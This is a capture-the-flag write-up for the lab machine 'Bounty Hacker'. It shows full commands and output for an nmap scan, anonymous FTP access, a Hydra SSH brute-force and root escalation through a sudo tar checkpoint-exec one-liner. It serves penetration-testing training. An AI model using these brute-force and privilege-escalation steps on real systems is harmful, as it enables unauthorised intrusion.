# [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)

`Machine's IP - 10.10.113.185`

# Reconnaissance and Discovery
So, the first thing was to start out with a simple nmap scan and outputting the results to a log file.

`nmap -sS -sC -sV 10.10.113.185 -Pn > nmap-bountyhacker.log`

# Analyzing Information and Risks
I certainly noticed that FTP (File Transfer Protocol) allowed Anonymous login, so I went to check that out. The website didn't have anything important.

```
Starting Nmap 7.70 ( https://nmap.org ) at 2020-11-16 20:52 Central Standard Time (Mexico)
Nmap scan report for 10.10.136.125
Host is up (0.49s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07 20:41 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07 20:47 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.20.112
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.71 seconds
```

I logged into FTP `ftp 10.10.113.185` with user `Anonymous` and, bingo! I'm in. Listing the contents, I got this:

```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
locks.txt
task.txt
226 Directory send OK.
ftp: 24 bytes received in 0.00Seconds 24.00Kbytes/sec.
```

Using `mget *` I downloaded both files, and in my local directory I saw the content.

The next thing was getting Hydra ready. I passed the `-l lin` for user and `-P locks.txt` for the list and .. 

`[22][ssh] host: 10.10.113.185   login: lin   password: ******************`

Houston, we're in.

Now that I had the SSH login credentials, I decided to look around. So, I logged in `ssh lin@10.10.113.185`. Inside, I listed the contents
of the current directory and found the first flag.
Question 4 - user.txt


```
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
******************
```

So, being here I could've gone with [Linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) but since the password was already cracked I listed the users permissions with `sudo -l`.
I noted the following:

```
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

With this, I decided to go to [GTFOBins](https://gtfobins.github.io/) and searched for tar. Obviously I went with the sudo option:

`tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`

Aaaanddd, we have root.

```bash
root@bountyhacker:~/Desktop# whoami
root
root@bountyhacker:~/Desktop# cd /root
root@bountyhacker:/root# ls
root.txt
root@bountyhacker:/root# cat root.txt
******************
```

## License
[MIT](https://choosealicense.com/licenses/mit/)
